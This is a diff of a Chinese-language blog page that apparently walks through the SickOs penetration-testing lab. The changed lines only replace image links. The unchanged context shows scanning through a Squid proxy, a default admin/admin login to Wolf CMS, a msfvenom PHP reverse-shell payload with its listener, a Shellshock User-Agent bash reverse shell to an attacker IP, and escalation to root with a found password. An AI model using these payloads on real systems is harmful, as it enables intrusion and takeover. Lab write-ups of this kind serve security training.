@@ -534,7 +534,7 @@
 	<span class="token operator">-</span>sP <span class="token punctuation">:</span> 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping
 	<span class="token operator">-</span>T4： 指定扫描过程使用的时序，总有<span class="token number">6</span>个级别（<span class="token number">0</span><span class="token operator">-</span><span class="token number">5</span>），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625488802260-9a7bc345-a871-43e3-a291-af8aae42b5ce.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616298.png" alt="img"></p>
 <p>我们已经找到了目标计算机IP地址：192.168.1.11</p>
 <p>第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了nmap全端口T5速度扫描：</p>
 <pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sS <span class="token operator">-</span>sV <span class="token operator">-</span>sC <span class="token operator">-</span>O <span class="token operator">-</span>T5  <span class="token operator">-</span>Pn <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.11</span>
@@ -549,7 +549,7 @@
 	<span class="token operator">-</span>p<span class="token operator">-</span>：进行全端口扫描
 	<span class="token operator">-</span>Pn：禁用主机检测（<span class="token operator">-</span>Pn）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625489265480-d004e9de-b2d6-447c-a7c8-23f3727f92e6.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616592.png" alt="img"></p>
 <table>
 <thead>
 <tr>
@@ -575,15 +575,15 @@
 </tr>
 </tbody></table>
 <p>目标计算机上开放了22、3128、8080三个端口。</p>
-<h2 id="Squid-枚举"><a href="#Squid-枚举" class="headerlink" title="Squid 枚举"></a>Squid 枚举</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625489832462-ea47ada4-bf0d-4207-bc5f-05e5479eaf94.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625490115939-b1890c08-c033-45e5-bc14-b1a7564cdec7.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625490571383-53382ea2-bada-49c1-b771-4dd97a171259.png" alt="img"></p>
+<h2 id="Squid-枚举"><a href="#Squid-枚举" class="headerlink" title="Squid 枚举"></a>Squid 枚举</h2><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616669.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616803.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616470.png" alt="img"></p>
 <h2 id="Nikto-通过代理扫描"><a href="#Nikto-通过代理扫描" class="headerlink" title="Nikto 通过代理扫描"></a>Nikto 通过代理扫描</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nikto ：开源的WEB扫描评估软件，可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等
 
 nikto <span class="token operator">-</span>h 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11 <span class="token operator">-</span>useproxy http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625490880205-874e1d7b-ac47-4084-9e97-24478438a90b.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625490919180-5dfcf0f9-e2b4-49e4-a9c3-65d1ad3e65c3.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616990.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617155.png" alt="img"></p>
 <table>
 <thead>
 <tr>
@@ -600,34 +600,34 @@ nikto <span class="token operator">-</span>h 192<span class="token punctuation">
 </tbody></table>
 <p>Nikto 扫描发现存在<code>robots.txt</code>目录、<code>cgi-bin/status</code>（容易受到shellshock攻击），存在可利用漏洞；</p>
 <h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>这边先用开启代理，然后访问目标主机的80端口；</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491096696-e33ad101-5fe3-46e2-aee5-6a0bda320087.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491166160-fa2fe2c0-a950-4200-8122-80a0fb93b961.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617771.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617709.png" alt="img"></p>
 <p>查看源代码没啥游泳的信息，这边是用代理来访问的80，打开robots.txt发现存在wolfcms目录；</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491393695-4eaaf303-7c36-4502-b29a-c8fb3e5e8478.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617365.png" alt="img"></p>
 <p>找到/wolfcms的信息，有可能此网站是使用Wolf CMS中搭建的，也可能是个目录……..</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491427774-54f9bdb9-ac9d-46ea-b7ef-283ea51ba697.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617306.png" alt="img"></p>
 <p>使用搜索引擎搜索Wolf CMS，发现是个开源的CMS，在github[<a target="_blank" rel="noopener" href="https://github.com/wolfcms/wolfcms]%E4%B8%8A%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81%E4%BF%A1%E6%81%AF%EF%BC%9B">https://github.com/wolfcms/wolfcms]上可以查看到源码信息；</a></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491730188-e47473d8-d6a4-4e53-aa27-b6e4f63c7dec.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491872657-160d5a0c-7404-4b8e-a160-93c91fdcb85f.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625492107077-2477680c-3a6d-4b93-b0ce-824240e4a06f.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617175.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617808.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617256.png" alt="img"></p>
 <h2 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">gobuster <span class="token function">dir</span> <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/  <span class="token operator">-</span>w <span class="token operator">/</span>usr/share/wordlists/dirbuster/directory-list-2<span class="token punctuation">.</span>3-medium<span class="token punctuation">.</span>txt <span class="token operator">-</span>t 50 <span class="token operator">--</span>random-agent   <span class="token operator">--</span>proxy   http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625543994254-cea6e145-030e-49ec-885d-94fd76db4d2d.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625544093447-989c41d2-6018-45ee-8e49-8e2d1d53a1f5.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618447.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618617.png" alt="img"></p>
 <p>访问下/?/admin/login，这是通病…遇到Wolf cms直接能使用这个目录进入登录界面</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625491995376-9a943e81-22f0-4f58-98be-7711f9e185d5.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618975.png" alt="img"></p>
 <p>使用账户密码admin/admin成功登录到网站后台(不要问我怎么知道的…….)</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625492062491-1bf6f796-d5f3-4007-84f0-a88efbd4fbe2.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625492484023-9aef7233-cd6c-4b56-bdde-90c07f1ac94c.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618419.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618261.png" alt="img"></p>
 <h2 id="上传Webshell"><a href="#上传Webshell" class="headerlink" title="上传Webshell"></a>上传Webshell</h2><h3 id="1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"><a href="#1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；" class="headerlink" title="1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"></a>1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；</h3><p>成功登录后，发现能上传文件，这边要使用msfvenom做PHP木马文件上传进行shell提权</p>
 <h4 id="1、筛选payload"><a href="#1、筛选payload" class="headerlink" title="1、筛选payload"></a>1、筛选payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>l payload <span class="token punctuation">|</span> grep php <span class="token punctuation">|</span> grep meterpreter    筛选合适的payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625492694428-c1bb5de2-0a57-4525-8951-e9a7a12392dc.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618025.png" alt="img"></p>
 <h4 id="2、生成payload"><a href="#2、生成payload" class="headerlink" title="2、生成payload"></a>2、生成payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>p php/meterpreter_reverse_tcp lhost=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7 lport=6666 <span class="token operator">-</span>o Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625493050247-8085e516-f41c-443a-b773-90c43d8bcaee.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619417.png" alt="img"></p>
 <h4 id="3、上传payload"><a href="#3、上传payload" class="headerlink" title="3、上传payload"></a>3、上传payload</h4><p>在web页面上传后记录下上传文件的路径；</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625493135854-efbcb978-6628-48b1-a69e-50f00a4d951d.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619999.png" alt="img"></p>
 <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">上传后文件的目录：http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/public/Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="4、Kali设置监听载荷"><a href="#4、Kali设置监听载荷" class="headerlink" title="4、Kali设置监听载荷"></a>4、Kali设置监听载荷</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">use exploit/multi/handler
@@ -637,15 +637,15 @@ show options
 <span class="token function">set</span> LPORT 6666
 exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625493300660-ad7ca097-e95c-4146-9dc5-440ece7e87a9.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625493415266-4f8f23e3-1091-4a0d-aa53-9f75b77f3ace.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619404.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619212.png" alt="img"></p>
 <p>注意：此时上传的php类型的Meterpreter是不具备完整功能的，因此可以继续上传对应操作系统类型的payload获取更多的操作功能；这里发现随然获取了Metrepreter会话，但是shell命令无法执行，后续使用冰蝎上传weblshell连接；</p>
 <h3 id="2、利用冰蝎上传weblshell连接"><a href="#2、利用冰蝎上传weblshell连接" class="headerlink" title="2、利用冰蝎上传weblshell连接"></a>2、利用冰蝎上传weblshell连接</h3><p>这里必须配置好代理才可以正常连接webshell；</p>
-<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625536956286-bf10d381-6732-43db-be3b-3dd0b02a0339.png" alt="img"></h4><h2 id="Shellshock-Bash-反向-Shell"><a href="#Shellshock-Bash-反向-Shell" class="headerlink" title="Shellshock Bash 反向 Shell"></a>Shellshock Bash 反向 Shell</h2><p>Burp Suite 用于操作 User-Agent：包括 bash 反向 shell。</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619370.png" alt="img"></h4><h2 id="Shellshock-Bash-反向-Shell"><a href="#Shellshock-Bash-反向-Shell" class="headerlink" title="Shellshock Bash 反向 Shell"></a>Shellshock Bash 反向 Shell</h2><p>Burp Suite 用于操作 User-Agent：包括 bash 反向 shell。</p>
 <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> ignored<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">/</span>bin/bash <span class="token operator">-</span>i >&amp; <span class="token operator">/</span>dev/tcp/192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>221<span class="token punctuation">.</span>139/443 0>&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625496313431-016dacbd-2a26-4c11-9f1f-5f2f5060911a.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625496301802-1eac507c-b8c1-4d12-841e-10fea1321369.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619992.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619018.png" alt="img"></p>
 <p>查看/var/www/wolfcms/目录下的config.php文件；</p>
 <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">/</span><span class="token operator">/</span> Database settings:
 <span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_DSN'</span><span class="token punctuation">,</span> <span class="token string">'mysql:dbname=wolf;host=localhost;port=3306'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -654,12 +654,12 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'TABLE_PREFIX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>查看系统存在的可登录账户：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625534894942-48ff9917-3de0-435d-8749-83cf5d67ea59.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620535.png" alt="img"></p>
 <p>使用python一句话获取标准shell</p>
 <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python <span class="token operator">-</span>c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625535832495-b71e7e54-53d4-476f-9599-58b862b2928a.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625544442975-4f2d8ced-485f-4831-96f4-acc160a1e39d.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620816.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620133.png" alt="img"></p>
 <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">www-<span class="token keyword">data</span>@SickOs:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www$ su <span class="token operator">-</span> sickos
 su <span class="token operator">-</span> sickos
 Password: john@123
@@ -676,8 +676,8 @@ sudo su
 
 root@SickOs:<span class="token operator">/</span>home/sickos<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625535933066-d4ae66d7-72c8-40b6-b3a0-153b5b1ef561.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12785751/1625536001789-7e74ee89-de4f-4690-9bac-e5548de8db47.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620364.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620177.png" alt="img"></p>
 <p>成功获取到Flag；</p>
 <p>若有收获，就点个赞吧</p>
 
